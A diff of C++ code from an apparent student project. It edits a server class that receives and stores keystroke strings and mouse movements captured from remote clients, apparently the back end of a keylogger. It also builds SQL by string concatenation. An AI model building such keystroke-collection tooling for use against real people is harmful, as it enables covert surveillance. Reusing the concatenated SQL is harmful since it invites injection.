@@ -5,15 +5,13 @@
 // Login   <debrab_t@epitech.net>
 //
 // Started on  Mon Nov  7 10:23:09 2016 debrab_t
-// Last update Mon Nov 14 18:50:37 2016 debrab_t
+// Last update Tue Nov 15 14:22:56 2016 debrab_t
 //
 
 /*
   TODO
 
-  - appeler close quand un client ce deconnect du serv
-  - tester le truc juste au dessus
-  - verifier si on connect puis déconnect puis reconnect client
+  - tester la deconnexion depuis le server en cmd
 */
 
 #include "socket/socketC/serverTcpSocketC.hpp"
@@ -106,7 +104,6 @@ bool		SqlServer::connectClient(spider::PacketUnserializer &packet)
       return (false);
     }
   id_client = std::to_string(hea.id);
-  std::cout << "--->IDN<---ID:" << id_client << std::endl;
   data = id_client + ", '" + std::string(idn.key) + "', " + "TRUE";
   if (!isClient(id_client))
     {
@@ -211,7 +208,6 @@ bool	SqlServer::addKeyboardString(spider::PacketUnserializer &packet)
       return (false);
     }
   id_client = std::to_string(hea.id);
-  std::cout << "--->TOC<---ID:" << id_client << std::endl;
   if (isClient(id_client) && isClientState(id_client))
     {
       std::map<HandleData::column, std::string> mapTst;
@@ -220,7 +216,6 @@ bool	SqlServer::addKeyboardString(spider::PacketUnserializer &packet)
 	_strTOC += std::string(toc.id);
       else
 	{
-	  std::cout << "string to save--->" << _strTOC << std::endl;
 	  mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::stringTOC, _strTOC));
       	  _strTOC = "";
 	}
@@ -245,6 +240,7 @@ bool				SqlServer::response(spider::PacketUnserializer &packet)
   PackageHeader			hea;
   std::string			id_client;
 
+  std::cout << "RESPONSE" << std::endl;
   ans = packet.getData<PackageAnswer>();
   hea = packet.getHeader();
   if (hea.magicNumber != REC)
@@ -252,7 +248,16 @@ bool				SqlServer::response(spider::PacketUnserializer &packet)
       std::cerr << "Response of client but magic number is false..." << std::endl;
       return (false);
     }
-  std::cout << ans.msg << std::endl;
+  std::string	stringPacket(packet.getAnswerPacketType(), 0, 3);
+  //std::cout << ans.msg << std::endl;
+  std::cout << "StringPacket:" << stringPacket << std::endl;
+  id_client = std::to_string(hea.id);
+
+  if (stringPacket.compare("DEC") == 0 && isClient(id_client) && isClientState(id_client))
+    {
+      std::cout << "BBD SET TO FALSE" << std::endl;
+      sqlMan.updateData("client", "state = FALSE WHERE ID_CLIENT=" + id_client);
+    }
   return (true);
 }
 
@@ -264,7 +269,7 @@ bool				SqlServer::disconnectClient(spider::PacketUnserializer &packet)
   PackageAnswer		ans;
   std::string		id_client;
 
-  std::cout << "--->DEC<---" << std::endl;
+  std::cout << "------>DEC<-------" << std::endl;
   dec = packet.getData<PackageCMDLogOut>();
   hea = packet.getHeader();
   if (hea.magicNumber != SEND)
@@ -275,9 +280,7 @@ bool				SqlServer::disconnectClient(spider::PacketUnserializer &packet)
   id_client = std::to_string(hea.id);
   if (isClient(id_client) && isClientState(id_client))
     {
-      std::cout << "--->disconnect with id:" << id_client << std::endl;
       sqlMan.updateData("client", "state = FALSE WHERE ID_CLIENT=" + id_client);
-      hea.magicNumber = REC;
       ans.header = hea;
       ans.code = 208;
       std::strncpy(ans.cmd, "DEC", 3);
@@ -295,24 +298,32 @@ void	SqlServer::feedPointMap()
   _pointMap.insert(std::pair<std::string,bddFunc>("MVT", &SqlServer::addMouseMouvement));
   _pointMap.insert(std::pair<std::string,bddFunc>("TOC", &SqlServer::addKeyboardString));
   _pointMap.insert(std::pair<std::string,bddFunc>("DEC", &SqlServer::disconnectClient));
-  _pointMap.insert(std::pair<std::string,bddFunc>("SHU", &SqlServer::response));
-  _pointMap.insert(std::pair<std::string,bddFunc>("TAL", &SqlServer::response));
-  _pointMap.insert(std::pair<std::string,bddFunc>("PIN", &SqlServer::response));
-  _pointMap.insert(std::pair<std::string,bddFunc>("SIN", &SqlServer::response));
-  _pointMap.insert(std::pair<std::string,bddFunc>("NOR", &SqlServer::response));
-  _pointMap.insert(std::pair<std::string,bddFunc>("MOD", &SqlServer::response));
 }
 
 bool		SqlServer::handleData(spider::PacketUnserializer &packet, std::shared_ptr<spider::socket::user> usr)
 {
-  std::string	stringPacket(packet.getPacketType(), 0, 3);
-  bool		ret = false;
+  PackageHeader		hea;
 
-  std::cout << "--->hello" << std::endl;
-  _user = usr;
-  if (!_cnt)
-    return (false);
-  else if (_pointMap.find(stringPacket) != _pointMap.end())
-    ret = ((*this).*_pointMap.find(stringPacket)->second)(packet);
-  return (ret ? true : disconnectClient(packet));
+  hea = packet.getHeader();
+  std::cout << "MAGIC:" << std::hex << hea.magicNumber << std::dec << std::endl;
+  if (hea.magicNumber == REC)
+    {
+      std::cout << "----->REC" << std::endl;
+      response(packet);
+      return (true);
+    }
+  else if (hea.magicNumber == SEND)
+    {
+      std::cout << "----->SEND" << std::endl;
+      std::string	stringPacket(packet.getPacketType(), 0, 3);
+      bool		ret = false;
+
+      std::cout << "--->HAND:" << stringPacket << std::endl;
+      _user = usr;
+      if (!_cnt)
+	return (false);
+      else if (_pointMap.find(stringPacket) != _pointMap.end())
+	ret = ((*this).*_pointMap.find(stringPacket)->second)(packet);
+      return (ret ? true : disconnectClient(packet));
+    }
 }
